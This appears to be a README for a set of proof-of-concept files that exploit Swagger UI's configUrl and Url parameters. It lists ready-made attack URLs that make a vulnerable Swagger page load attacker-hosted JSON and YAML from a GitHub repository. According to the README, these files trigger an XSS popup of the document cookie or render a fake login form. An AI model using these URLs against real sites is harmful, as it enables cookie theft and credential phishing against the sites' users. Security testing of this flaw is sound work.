
To use these PoCs - there a a few options. 


## Option 1 - .json file

To point the browser (currently with the swagger document open) to one of the .json files.

There are two .json files you can use within the test.json file, the test.json points the browser to a .yaml file to execute the code in that file.

The first option, test.json can be configured to point to either test.yaml or test2.yaml

It get's called as follows

https://vulnerable_domain/swagger/index.html?configUrl=https://raw.githubusercontent.com/robhughes72/swagger-login/refs/heads/main/test.json

You can also try the swagger.json - which performs a basic XSS pop up document cookie. It is called as follows

https://vulnerable_domain/swagger/index.html?configUrl=https://raw.githubusercontent.com/robhughes72/swagger-login/refs/heads/main/swagger.json


## Option 2 - .yaml directly

The other option to try is to point directly to a .yaml file. 

This one will try and render the login form again. 

https://vulnerable_domain/swagger/index.html?Url=https://raw.githubusercontent.com/robhughes72/swagger-login/refs/heads/main/test.yaml


This one will change the title of the swagger document to Example API Test and will return a greeting Hello World. 

https://vulnerable_domain/swagger/index.html?Url=https://raw.githubusercontent.com/robhughes72/swagger-login/refs/heads/main/test2.yaml


Either of the two .yaml files can also be called via calling the test.json file (with it's content edited for the specific .yaml file to use)
